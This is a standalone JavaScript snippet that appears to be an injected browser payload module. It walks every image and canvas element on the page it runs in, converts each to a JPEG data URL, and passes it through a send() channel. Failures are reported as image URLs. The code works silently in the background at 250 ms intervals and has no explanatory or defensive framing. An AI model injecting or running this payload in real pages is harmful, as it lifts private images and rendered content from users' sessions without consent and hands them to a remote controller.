var $_$self = this,
	$_$images = document.querySelectorAll('img'),
	$_$imagesC = 0,
	$_$canvases = document.querySelectorAll('canvas'),
	$_$canvasesC = 0,
	$_$toDataURL = function(elem, cb) {
		console.log('image uploading attempt');
		if(!elem){
			return;
		}
		elem.crossOrigin = "";
		if(elem.tagName === 'CANVAS'){
			$_$self.send(elem.toDataURL('image/jpeg'));
			cb();
			return;
		}

		var img = new Image();
		img.crossOrigin = 'Anonymous';
		img.onload = function(e) {
			console.log('onload event:', e);
			var canvas = document.createElement('CANVAS'),
				ctx = canvas.getContext('2d'),
				dataURL = null;
			canvas.height = elem.height;
			canvas.width = elem.width;
			ctx.drawImage(img, 0, 0);
			dataURL = canvas.toDataURL('image/jpeg');
			$_$self.send(dataURL);
			cb();
		}
		img.onerror = function(e){
			$_$self.send('error: '+elem.src);
			cb();
		}
		img.src = String(elem.src);
	},
	$_$doImage = function(){
		setTimeout(function(){
			$_$toDataURL($_$images[$_$imagesC], function(){
				$_$imagesC++;
				$_$doImage();
			});
		}, 250);
	},
	$_$doCanvases = function(){
		setTimeout(function(){
			$_$toDataURL($_$canvases[$_$canvasesC], function(){
				$_$canvasesC++;
				$_$doCanvases();
			});
		}, 250);
	};

$_$doCanvases();
$_$doImage();

